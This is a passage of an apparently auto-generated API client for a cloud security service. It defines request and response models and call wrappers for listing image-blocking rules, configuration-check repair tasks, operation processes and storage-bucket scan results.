      strategyName?: string(name='StrategyName', description='The rule name.', example='auto-strategy-vohuiq'),
      unScanedImage?: boolean(name='UnScanedImage', description='Indicates whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='List', description='The rules.'),
  message?: string(name='Message', description='The message that shows the export task result. The value is fixed as **success**, which indicates that the export task is successful.', example='success'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7DFD947C-9172-5129-B783-DD14C55191D2'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListOpaClusterStrategyNewResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOpaClusterStrategyNewResponseBody(name='body'),
}

/**
 * @summary Queries at-risk image blocking rules.
 *
 * @param request ListOpaClusterStrategyNewRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOpaClusterStrategyNewResponse
 */
async function listOpaClusterStrategyNewWithOptions(request: ListOpaClusterStrategyNewRequest, runtime: Util.RuntimeOptions): ListOpaClusterStrategyNewResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.label)) {
    query['Label'] = request.label;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOpaClusterStrategyNew',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries at-risk image blocking rules.
 *
 * @param request ListOpaClusterStrategyNewRequest
 * @return ListOpaClusterStrategyNewResponse
 */
async function listOpaClusterStrategyNew(request: ListOpaClusterStrategyNewRequest): ListOpaClusterStrategyNewResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOpaClusterStrategyNewWithOptions(request, runtime);
}

model ListOperationCheckRequest {
  checkId?: long(name='CheckId', description='Check item ID.
> Obtain this parameter by calling the [ListCheckResult](~~ListCheckResult~~) interface.', example='23'),
  endTime?: long(name='EndTime', description='Timestamp (in milliseconds) of the end time of the queried task.', example='1719923175001'),
  lang?: string(name='Lang', description='Language type for request and response messages, default value is zh. Values:
- **zh**: Chinese
- **en**: English', example='zh'),
  operationTaskInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='Cloud asset instance ID.', example='r-bp1642ib4bg2bm****'),
      regionId?: string(name='RegionId', description='Region ID.', example='cn-hangzhou'),
      vendor?: string(name='Vendor', description='Asset vendor. Values:

- **ALIYUN**: Alibaba Cloud', example='ALIYUN'),
    }
  ](name='OperationTaskInstances', description='Information about the operated instances.

This parameter is required.'),
  startTime?: long(name='StartTime', description='Timestamp (in milliseconds) of the start time of the queried task.', example='1719923175000'),
  type?: string(name='Type', description='Task type corresponding to the task:
- **REPAIR**: Repair task
- **ROLLBACK**: Rollback task

This parameter is required.', example='REPAIR'),
}

model ListOperationCheckResponseBody = {
  operationTaskInstanceDetails?: [ 
    {
      checkId?: long(name='CheckId', description='Check item ID.', example='58'),
      instanceId?: string(name='InstanceId', description='Instance ID.', example='lb-2zefdwrre8ey8ewr0****'),
      regionId?: string(name='RegionId', description='Region ID.', example='cn-shanghai'),
      repair?: [ 
        {
          operateTime?: long(name='OperateTime', description='Timestamp for processing the risk. Unit: milliseconds.', example='1719923175000'),
          repairConfigs?: [ 
            {
              flowId?: string(name='FlowId', description='ID of the repair process during the repair operation.', example='cd7c4d34c1034de08308535d6cee***'),
              name?: string(name='Name', description='Name of the repair parameter.', example='IpList'),
              showName?: string(name='ShowName', description='Display name.', example='IP List'),
              typeDefine?: string(name='TypeDefine', description='JSON string for the custom configuration type of the check item.', example='{\\\\"type\\\\":\\\\"STRING\\\\",\\\\"range\\\\":[0,64]}'),
              value?: string(name='Value', description='Real-time value of the parameter for the instance.', example='192.168.1XX.1XX'),
            }
          ](name='RepairConfigs', description='Fix the corresponding configuration information.'),
          status?: string(name='Status', description='Status of the corresponding task.', example='REPAIR_SUCCESS_VERIFIED'),
          statusShowName?: string(name='StatusShowName', description='Display name of the repair task status.', example='repair success verified'),
          taskId?: string(name='TaskId', description='TaskId of the operation task.', example='6a829841e335b0fb6e0014463284****'),
        }
      ](name='Repair', description='Information about the repair task.'),
      type?: string(name='Type', description='The operation type of the corresponding task:
 - **REPAIR**: Repair task 
- **ROLLBACK**: Rollback task', example='REPAIR'),
    }
  ](name='OperationTaskInstanceDetails', description='Detailed information about the operation instances.'),
  requestId?: string(name='RequestId', description='The ID of the current call request, which is a unique identifier generated by Alibaba Cloud for the request, and can be used for troubleshooting and problem localization.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
}

model ListOperationCheckResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOperationCheckResponseBody(name='body'),
}

/**
 * @summary Query the list of instance results under the operation check item
 *
 * @description This interface is only available to users who have purchased the cloud platform configuration check authorization or enabled the pay-as-you-go service for cloud platform configuration checks.
 *
 * @param request ListOperationCheckRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOperationCheckResponse
 */
async function listOperationCheckWithOptions(request: ListOperationCheckRequest, runtime: Util.RuntimeOptions): ListOperationCheckResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOperationCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the list of instance results under the operation check item
 *
 * @description This interface is only available to users who have purchased the cloud platform configuration check authorization or enabled the pay-as-you-go service for cloud platform configuration checks.
 *
 * @param request ListOperationCheckRequest
 * @return ListOperationCheckResponse
 */
async function listOperationCheck(request: ListOperationCheckRequest): ListOperationCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOperationCheckWithOptions(request, runtime);
}

model ListOperationProcessRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  endTime?: long(name='EndTime', description='The end of the time range to query. Unit: milliseconds.', example='1635575219000'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  startTime?: long(name='StartTime', description='The beginning of the time range to query. Unit: milliseconds.', example='1680919232000'),
  statusCodes?: [ int32 ](name='StatusCodes', description='The task status codes.'),
  taskIds?: [ string ](name='TaskIds', description='The task IDs.'),
  taskTypes?: [ string ](name='TaskTypes', description='The task types. Valid values:

*   CHECK_ALL: full check.
*   CHECK_POLICY: policy-based check for which check items are configured.
*   CHECK_SCHEDULE: scheduled check.
*   CHECK_ITEM: specific check item-based check.
*   CHECK_INSTANCE: specific check item-based check on specific instances.'),
}

model ListOperationProcessResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries.', example='263'),
  }(name='PageInfo', description='The pagination information.'),
  processes?: [ 
    {
      createTime?: long(name='CreateTime', description='The time when the task was created. Unit: milliseconds.', example='1674388824000'),
      endTime?: long(name='EndTime', description='The end time of the task. Unit: milliseconds.', example='1705467559000'),
      finishCount?: int32(name='FinishCount', description='The number of tasks that are complete.', example='197'),
      startTime?: long(name='StartTime', description='The start time of the task. Unit: milliseconds.', example='1705457102000'),
      statusCode?: int32(name='StatusCode', description='The task status code. Valid values:

*   0: not started.
*   1: running.
*   2: complete.
*   3: times out.', example='1'),
      taskId?: string(name='TaskId', description='The ID of the operation task.', example='3d7a1b68-599f-4e16-9b45-e920a183b***'),
      taskType?: string(name='TaskType', description='The task type. Valid values:

*   CHECK_ALL: full check.
*   CHECK_POLICY: policy-based check for which check items are configured.
*   CHECK_SCHEDULE: scheduled check.
*   CHECK_ITEM: specific check item-based check.
*   CHECK_INSTANCE: specific check item-based check on specific instances.', example='CHECK_POLICY'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='337'),
    }
  ](name='Processes', description='The information about the operation tasks.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model ListOperationProcessResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOperationProcessResponseBody(name='body'),
}

/**
 * @summary Queries a list of operation tasks.
 *
 * @description You can query only operation tasks.
 *
 * @param request ListOperationProcessRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOperationProcessResponse
 */
async function listOperationProcessWithOptions(request: ListOperationProcessRequest, runtime: Util.RuntimeOptions): ListOperationProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusCodes)) {
    query['StatusCodes'] = request.statusCodes;
  }
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  if (!Util.isUnset(request.taskTypes)) {
    query['TaskTypes'] = request.taskTypes;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOperationProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of operation tasks.
 *
 * @description You can query only operation tasks.
 *
 * @param request ListOperationProcessRequest
 * @return ListOperationProcessResponse
 */
async function listOperationProcess(request: ListOperationProcessRequest): ListOperationProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOperationProcessWithOptions(request, runtime);
}

model ListOperationProcessDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: 1.', example='1'),
  endTime?: long(name='EndTime', description='The end of the time range to query. Unit: milliseconds.', example='1731555850000'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  startTime?: long(name='StartTime', description='The beginning of the time range to query. Unit: milliseconds.', example='1731469330000'),
  statusCodes?: [ int32 ](name='StatusCodes', description='The subtask status codes.'),
  taskIds?: [ string ](name='TaskIds', description='The IDs of operation tasks.'),
}

model ListOperationProcessDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries.', example='19'),
  }(name='PageInfo', description='The pagination information.'),
  processDetails?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the asset associated with the operation subtask.', example='1'),
      assetType?: int32(name='AssetType', description='The type of the asset associated with the operation subtask.', example='8'),
      assetVendor?: int32(name='AssetVendor', description='The vendor of the asset associated with the operation subtask.', example='0'),
      checks?: [ 
        {
          checkId?: long(name='CheckId', description='The ID of the check item associated with the operation subtask.', example='133'),
          checkShowName?: string(name='CheckShowName', description='The name of the check item associated with the operation subtask.', example='Check for Security Center Agent Status'),
        }
      ](name='Checks', description='The check items associated with the operation subtask.'),
      createTime?: long(name='CreateTime', description='The timestamp when the task was created. Unit: milliseconds.', example='1706544199000'),
      detailTaskId?: string(name='DetailTaskId', description='The ID of the operation subtask.', example='fb4bcd41-a916-46bc-ab1a-65fd383be***'),
      endTime?: long(name='EndTime', description='The end timestamp of the operation subtask. Unit: milliseconds.', example='1706544199000'),
      startTime?: long(name='StartTime', description='The start timestamp of the operation subtask. Unit: milliseconds.', example='1730335622000'),
      statusCode?: int32(name='StatusCode', description='The subtask status code. Enumerated values:

*   0: not started.
*   1: running.
*   2: successful.
*   3: times out.
*   4: failed.', example='0'),
      taskId?: string(name='TaskId', description='The ID of the operation subtask.', example='v34578b8-e567-47ec-2345-3e5b077ca***'),
    }
  ](name='ProcessDetails', description='The information about the operation subtasks.'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3***'),
}

model ListOperationProcessDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOperationProcessDetailResponseBody(name='body'),
}

/**
 * @summary 查询操作任务子任务列表
 *
 * @description You can query only operation subtasks.
 *
 * @param request ListOperationProcessDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOperationProcessDetailResponse
 */
async function listOperationProcessDetailWithOptions(request: ListOperationProcessDetailRequest, runtime: Util.RuntimeOptions): ListOperationProcessDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusCodes)) {
    query['StatusCodes'] = request.statusCodes;
  }
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOperationProcessDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 查询操作任务子任务列表
 *
 * @description You can query only operation subtasks.
 *
 * @param request ListOperationProcessDetailRequest
 * @return ListOperationProcessDetailResponse
 */
async function listOperationProcessDetail(request: ListOperationProcessDetailRequest): ListOperationProcessDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOperationProcessDetailWithOptions(request, runtime);
}

model ListOperationTaskRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) API to obtain the check item ID.', example='76'),
  currentPage?: int32(name='CurrentPage', description='The page number to display in a paginated query.', example='1'),
  lang?: string(name='Lang', description='Set the language type for the request and response messages. The default value is **zh**. Values:

- **zh**: Chinese
- **en**: English', example='zh'),
  operationTaskInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='am-bp1vy2yaj1nvx****'),
      regionId?: string(name='RegionId', description='The ID of the region where the instance is located.', example='cn-hangzhou'),
      vendor?: string(name='Vendor', description='Cloud asset vendor.', example='ALIYUN'),
    }
  ](name='OperationTaskInstances', description='The instance information of the operation tasks to be queried.'),
  pageSize?: int32(name='PageSize', description='The maximum number of items to display per page in a paginated query.', example='10'),
  statuses?: [ string ](name='Statuses', description='A list of task statuses. Multiple statuses should be separated by commas (,). Values:

- **INIT**: Initialization
- **FAIL**: Processing failed
- **THROTTLING**: Repairing concurrently
- **IN_BACKUP**: Backing up
- **BACKED_UP**: Backed up
- **BACKUP_FAIL**: Backup failed
- **REPAIRING**: Repairing
- **REPAIR_SUCCESS**: Repair succeeded
- **REPAIR_FAIL**: Repair failed
- **REPAIR_SUCCESS_VERIFYING**: Verifying repair success
- **REPAIR_SUCCESS_UNVERIFIED**: Repair success verification failed
- **REPAIR_SUCCESS_VERIFIED**: Repair success verified
- **REPAIR_RE_EXECUTE**: Re-executing repair
- **ROLL_BACKING**: Rolling back
- **ROLL_BACKED**: Rolled back
- **ROLL_BACK_FAIL**: Rollback failed
- **ROLL_BACK_INIT**: Rollback initiated
- **ROLL_BACK_VERIFYING**: Verifying rollback success
- **ROLL_BACK_UNVERIFIED**: Rollback success verification failed
- **ROLL_BACK_VERIFIED**: Rollback success verified'),
  taskId?: string(name='TaskId', description='The ID of the task to be queried.', example='d7b2acf8d362742123e4a84e1bf8****'),
  type?: string(name='Type', description='The type of operation task to be queried:
- REPAIR: Repair
- ROLLBACK: Rollback', example='REPAIR'),
}

model ListOperationTaskResponseBody = {
  operationTasks?: [ 
    {
      checkId?: long(name='CheckId', description='检查项的ID。', example='3'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='checkShowName'),
      dealTime?: long(name='DealTime', description='The processing time of the task.', example='1723173101010'),
      errorCode?: string(name='ErrorCode', description='The error code.', example='BackUpScriptError'),
      errorMsg?: string(name='ErrorMsg', description='The error message.', example='backUp script error'),
      instanceFreed?: boolean(name='InstanceFreed', description='Whether the instance is released:
- true: Released
- false: Not released', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server instance.', example='i-wz9abo6wgjmh4yep****'),
      lastCheckTime?: long(name='LastCheckTime', description='The timestamp of the latest check, in milliseconds.', example='1723173101000'),
      regionId?: string(name='RegionId', description='服务器所在的地域的ID。', example='cn-shenzhen'),
      repairSupportType?: int32(name='RepairSupportType', description='The type of repair supported by the check item:

- **1**：Supports repair and rollback operations
- **2**：Supports repair but not rollback
- **3**：Redirect to a third-party platform for operation', example='1'),
      riskLevel?: string(name='RiskLevel', description='扫描出的告警的风险等级。取值：

- **high**：高危。
- **medium**：中危。
- **low**：低危。', example='high'),
      rootTaskId?: string(name='RootTaskId', description='The ID of the main task.', example='01db51b0e5307bb703a22611c86f****'),
      status?: string(name='Status', description='The status of the task. Possible values:

- **INIT**：Initialization
- **FAIL**：Processing failed
- **THROTTLING**：Repairing concurrently
- **IN_BACKUP**：Backing up
- **BACKED_UP**：Backed up
- **BACKUP_FAIL**：Backup failed
- **REPAIRING**：Repairing
- **REPAIR_SUCCESS**：Repair succeeded
- **REPAIR_FAIL**：Repair failed
- **REPAIR_SUCCESS_VERIFYING**：Verifying repair success
- **REPAIR_SUCCESS_UNVERIFIED**：Verification of repair success failed
- **REPAIR_SUCCESS_VERIFIED**：Verification of repair success succeeded
- **REPAIR_RE_EXECUTE**：Re-executing repair
- **ROLL_BACKING**：Rolling back
- **ROLL_BACKED**：Rolled back
- **ROLL_BACK_FAIL**：Rollback failed
- **ROLL_BACK_INIT**：Initiating rollback
- **ROLL_BACK_VERIFYING**：Verifying rollback success
- **ROLL_BACK_UNVERIFIED**：Verification of rollback success failed
- **ROLL_BACK_VERIFIED**：Verification of rollback success succeeded', example='REPAIRING'),
      statusShowName?: string(name='StatusShowName', description='The display status of the repair task.', example='Verified After Repair Success'),
      supportRollBack?: boolean(name='SupportRollBack', description='Whether rollback is supported:
- true: Supported
- false: Not supported', example='true'),
      taskId?: string(name='TaskId', description='The ID of the operation task.', example='5bb1a313f9924b728b3c12e007c1****'),
      type?: string(name='Type', description='The type of the operation task being queried:
- REPAIR: Repair
- ROLLBACK: Rollback', example='REPAIR'),
    }
  ](name='OperationTasks', description='操作任务的详细实例信息列表。'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the current page in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of items to display per page in a paginated query.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of records in the query result.', example='149'),
  }(name='PageInfo', description='Page information when performing a paginated query.'),
  requestId?: string(name='RequestId', description='The ID of the current request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model ListOperationTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOperationTaskResponseBody(name='body'),
}

/**
 * @summary Display the list of cloud product configuration check, repair, and rollback tasks
 *
 * @param request ListOperationTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOperationTaskResponse
 */
async function listOperationTaskWithOptions(request: ListOperationTaskRequest, runtime: Util.RuntimeOptions): ListOperationTaskResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOperationTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Display the list of cloud product configuration check, repair, and rollback tasks
 *
 * @param request ListOperationTaskRequest
 * @return ListOperationTaskResponse
 */
async function listOperationTask(request: ListOperationTaskRequest): ListOperationTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOperationTaskWithOptions(request, runtime);
}

model ListOssBucketRequest {
  bucketName?: string(name='BucketName', description='The name of the bucket.', example='iboxpublic****'),
  lang?: string(name='Lang', description='The language of the content in the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='en'),
}

model ListOssBucketResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', description='The name of the bucket.', example='iboxpublic****'),
      message?: string(name='Message', description='The reason why the bucket cannot be checked.', example='Unsupported Region.'),
      regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
      storageClass?: string(name='StorageClass', description='The storage class of the bucket. Valid values:

*   Standard (default)
*   IA
*   Archive
*   ColdArchive', example='Standard'),
      support?: boolean(name='Support', description='Indicates whether the bucket can be checked. Valid values:

*   true
*   false', example='true'),
      supportConfig?: string(name='SupportConfig', description='Whether to support config. Valid values:

* true
* false', example='true'),
    }
  ](name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model ListOssBucketResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOssBucketResponseBody(name='body'),
}

/**
 * @summary Queries Object Storage Service (OSS) buckets.
 *
 * @param request ListOssBucketRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOssBucketResponse
 */
async function listOssBucketWithOptions(request: ListOssBucketRequest, runtime: Util.RuntimeOptions): ListOssBucketResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketName)) {
    query['BucketName'] = request.bucketName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOssBucket',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries Object Storage Service (OSS) buckets.
 *
 * @param request ListOssBucketRequest
 * @return ListOssBucketResponse
 */
async function listOssBucket(request: ListOssBucketRequest): ListOssBucketResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOssBucketWithOptions(request, runtime);
}

model ListOssBucketScanInfoRequest {
  bucketName?: string(name='BucketName', description='The name of the bucket.', example='iboxpublic****'),
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  fuzzBucketName?: string(name='FuzzBucketName', description='The name of the bucket that is used for fuzzy match.', example='test'),
  hasRisk?: int32(name='HasRisk', description='Specifies whether at-risk objects are detected. Valid values:

*   **0**: No at-risk objects are detected.
*   **1**: At-risk objects are detected.', example='1'),
  lang?: string(name='Lang', description='The language of the content in the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  status?: int32(name='Status', description='The check status of the bucket. Valid values:

*   **1**: The bucket is not checked.
*   **2**: All objects in the bucket are being checked.
*   **3**: Only new objects in the bucket are being checked.
*   **4**: The bucket is checked.', example='1'),
}

model ListOssBucketScanInfoResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', description='The name of the bucket.', example='hz-new02****'),
      configStatus?: int32(name='ConfigStatus', description='Configuration status, valid values:

- **0**: No Configuration.
- **1**: Not Open.
- **2**: Open.', example='1'),
      decompressStatus?: int32(name='DecompressStatus', description='Bucket decompression configuration status, valid values:
- **0**: Decompression not configured.
- **1**: Decompression configured.', example='0'),
      highRisk?: long(name='HighRisk', description='The number of high-risk objects.', example='0'),
      lastScanEndTime?: long(name='LastScanEndTime', description='The time when the most recent check ended. Unit: milliseconds.', example='1698388233883'),
      lastScanTime?: long(name='LastScanTime', description='The time when the bucket was last checked. Unit: milliseconds.', example='1698388233883'),
      lowRisk?: long(name='LowRisk', description='The number of low-risk objects.', example='0'),
      mediumRisk?: long(name='MediumRisk', description='The number of medium-risk objects.', example='0'),
      message?: string(name='Message', description='The reason why the bucket cannot be checked.', example='Unsupported Region.'),
      regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
      scanObject?: long(name='ScanObject', description='The number of objects that are checked.', example='100'),
      scanned?: boolean(name='Scanned', description='Indicates whether the bucket is checked. Valid values:

*   **true**
*   **false**', example='false'),
      status?: int32(name='Status', description='The check status of the bucket. Valid values:

*   **1**: The bucket is not checked.
*   **2**: All objects in the bucket are being checked.
*   **3**: Only new objects are being checked.
*   **4**: The bucket is checked.', example='1'),
      storageClass?: string(name='StorageClass', description='The storage class of the bucket. Valid values:

*   **Standard**
*   **IA**
*   **Archive**
*   **ColdArchive**', example='Archive'),
      support?: boolean(name='Support', description='Indicates whether the bucket can be checked. Valid values:

*   true
*   false', example='true'),
      totalObject?: long(name='TotalObject', description='The total number of objects in the bucket.', example='100'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='165'),
  }(name='PageInfo', description='The page information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6C578F36-92D2-552C-8AA0-86EB1AC2****'),
}

model ListOssBucketScanInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOssBucketScanInfoResponseBody(name='body'),
}

/**
 * @summary Queries the risk information of an Object Storage Service (OSS) bucket.
 *
 * @param request ListOssBucketScanInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOssBucketScanInfoResponse
 */
async function listOssBucketScanInfoWithOptions(request: ListOssBucketScanInfoRequest, runtime: Util.RuntimeOptions): ListOssBucketScanInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketName)) {
    query['BucketName'] = request.bucketName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fuzzBucketName)) {
    query['FuzzBucketName'] = request.fuzzBucketName;
  }
  if (!Util.isUnset(request.hasRisk)) {
    query['HasRisk'] = request.hasRisk;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOssBucketScanInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the risk information of an Object Storage Service (OSS) bucket.
 *
 * @param request ListOssBucketScanInfoRequest
